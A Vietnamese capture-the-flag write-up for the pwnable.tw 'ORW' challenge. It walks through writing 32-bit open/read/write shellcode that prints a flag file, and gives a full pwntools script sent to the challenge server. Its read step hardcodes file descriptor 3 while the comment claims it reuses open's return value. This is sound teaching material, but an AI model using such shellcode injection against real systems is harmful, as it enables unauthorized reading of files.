### Pwnable.tw - ORW

# Preview 


![image](https://user-images.githubusercontent.com/90976397/176607610-e7504449-83a8-4102-a551-27399b28e04f.png)

Đây là câu thứ 2 trên Pwnable.tw và cũng là câu thứ 2 mà mình viết trong series này. 

Đây là một câu khá cơ bản trong mảng pwnable, chỉ đòi hỏi về kỹ năng viết assembly code.

Ở bài trước mình đã nói, assembly code rất là quan trọng trong mảng này, chừng nào còn đụng đến binary là còn đụng đến assembly code :D, vì thế nên hãy học assembly code một cách nghiêm túc.

![image](https://user-images.githubusercontent.com/90976397/176624348-f5b82f50-f67c-4826-ac89-cabfa564642a.png)

Tải file về rồi kiểm tra xem loại file và những cơ chế bảo mật nào được enable.

![image](https://user-images.githubusercontent.com/90976397/176624755-231c9ac4-9669-4340-b294-183c3231f7f9.png)

Một file ELF 32-bit LSB executable và không bị stripped

![image](https://user-images.githubusercontent.com/90976397/176625135-678c3bb1-7f60-4ef4-97ad-6bd6039db2a5.png)

Dường như chỉ có mỗi canary là được bật, ở bài trước mình đã nói sơ sơ về cơ chế Non-Executable, ở bài này NX disable thì hiển nhiên việc chúng ta sẽ làm đó là cần phải viết shellcode rồi :) viết sao thì ở dưới mình sẽ nói rõ.  

![EXfRo89XYAA-J5v](https://user-images.githubusercontent.com/90976397/176627953-76c18257-2360-4301-89d5-a404eab127a7.jpg)

# Analyze 

Mở IDA/Ghidra để xem thử bên trong nó có gì 

Btw, một lần nữa, mình khuyến khích các bạn nên đọc assembly code thay vì đọc pseudocode nhé, giúp ích nhiều lắm đấy 

![image](https://user-images.githubusercontent.com/90976397/176628953-4e10f5d3-b12d-4767-9a92-5f5c1751eb0e.png)

Dường như trong hàm main không có gì đặc biệt, chỉ là in ra dòng chữ "Give me your shell code: " rồi cho chúng ta nhập input vào.

Ở bài này thực sự không có gì nhiều để nói, nhưng mình sẽ cố gắng giải thích chi tiết để cho bạn hiểu rõ hơn về dạng bài viết assembly code nhé :).


# Exploit 

![image](https://user-images.githubusercontent.com/90976397/176630907-17df1123-de8d-4280-bce0-5b2a5634bb85.png)

Như description của bài này thì chúng ta có thể thấy nó đã chỉ cách làm bài này cho mình luôn rồi 

![image](https://user-images.githubusercontent.com/90976397/176631232-51a481c2-1239-43cf-916e-8933a5e29381.png)

Chỉ cần mở, đọc, in ra flag :) easy phải không ?

![75720175](https://user-images.githubusercontent.com/90976397/176632083-c218dd14-ac59-493c-9a7c-b8d03cb661e1.jpg)


Đầu tiên là push flag vào stack

Flag nằm ở ///home/orw/flag

Vì đây là cấu trúc 32-bit thế nên là phải đổi chuỗi "///home/orw/flag" sang hex và vì 32-bit nên chỉ push 4 byte một, ngoài ra đọc theo little-endian
"///home/orw/flag" đổi sang "galf/wro/emoh///"(vì đọc theo dạng byte little-endian) đổi sang mã hex là "67616c66 2f77726f 2f656d6f 682f2f2f"
```
shellcode = asm("push 0x0")
shellcode += asm("push 0x67616c66") #flag
shellcode += asm("push 0x2f77726f") #orw/
shellcode += asm("push 0x2f656d6f") #ome/
shellcode += asm("push 0x682f2f2f") #///h
```
Bây giờ cứ theo mô tả cả đề và từng bước đề đã nói mà làm thôi

Open
```
shellcode += asm("mov ebx, esp") #gán esp vào ebx, ebx- * file : esp
shellcode += asm("xor eax, eax") #khởi tạo eax
shellcode += asm("xor edx,edx") #edx mode = 0, read only
shellcode += asm("xor ecx, ecx") #ecx-flag: 0
shellcode += asm("mov eax, 0x05") #eax mode = 5, open
shellcode += asm("int 0x80") #syscall, syscall mình đã giải thích ở bài trước
```
Read
```
shellcode += asm("mov eax, 0x03") #eax mode = 3, read(3)
shellcode += asm("mov ebx,eax") #ebx-fd = eax, có nghĩa là handle->/home/orw/flag (3)
shellcode += asm("mov ecx,esp") #ecx-* buf: esp
shellcode += asm("mov edx, 0x40") #edx-size: 0x40
shellcode += asm("int 0x80") #syscall
```
Write

```
shellcode += asm("mov eax, 0x04") #eax mode = 4, write(4)
shellcode += asm("mov ebx, 0x01") #ebx-fd: stdout(1)
shellcode += asm("int 0x80") #syscall
```
Và cuối cùng chỉ cần execute cái shell này và chúng ta đã có được flag

![image](https://user-images.githubusercontent.com/90976397/176654117-d45db29d-e594-410e-a2e3-41e2332d700a.png)

full script: 
```
from pwn import * 

r = remote("chall.pwnable.tw",10001)
shellcode = asm("push 0x0")
shellcode += asm("push 0x67616c66") #flag
shellcode += asm("push 0x2f77726f") #orw/
shellcode += asm("push 0x2f656d6f") #ome/
shellcode += asm("push 0x682f2f2f") #///h

shellcode += asm("mov ebx, esp") #gán esp vào ebx, ebx- * file : esp
shellcode += asm("xor eax, eax") #khởi tạo eax
shellcode += asm("xor edx,edx") #edx mode = 0, read only
shellcode += asm("xor ecx, ecx") #ecx-flag: 0
shellcode += asm("mov eax, 0x05") #eax mode = 5, open
shellcode += asm("int 0x80") #syscall, syscall mình đã giải thích ở bài trước 

shellcode += asm("mov eax, 0x03") #eax mode = 3, read(3)
shellcode += asm("mov ebx,eax") #ebx-fd = eax, có nghĩa là handle->/home/orw/flag (3)
shellcode += asm("mov ecx,esp") #ecx-* buf: esp
shellcode += asm("mov edx, 0x40") #edx-size: 0x40
shellcode += asm("int 0x80") #syscall

shellcode += asm("mov eax, 0x04") #eax mode = 4, write(4)
shellcode += asm("mov ebx, 0x01") #ebx-fd: stdout(1)
shellcode += asm("int 0x80") #syscall
print(shellcode)
r.sendline((shellcode))

r.interactive()
```

Thực chất thư viện pwntools rất là mạnh, nó cung cấp cho chúng ta rất là nhiều công cụ để giải một câu pwn. Ở câu này chúng ta có thể sử dụng module pwntools như sau: 

```
shellcode = shellcraft.i386.pushstr('/home/orw/flag')
shellcode += shellcraft.i386.linux.syscall('SYS_open', 'esp')
shellcode += shellcraft.i386.linux.syscall('SYS_read', 'eax', 'esp', 0x50)
shellcode += shellcraft.i386.linux.syscall('SYS_write', 1, 'esp', 0x50)
```
Chỉ cần 4 dòng, ngắn hơn rất nhiều so với cái ở trên. Nhưng cái gì cũng có cái giá của nó, trước khi bạn sử dụng những công cụ có sẵn như này thì bạn phải thuần thục ngôn ngữ assembly đã, không nên dựa dẫm quá nhiều vào những cái có sẵn. 

Peace~





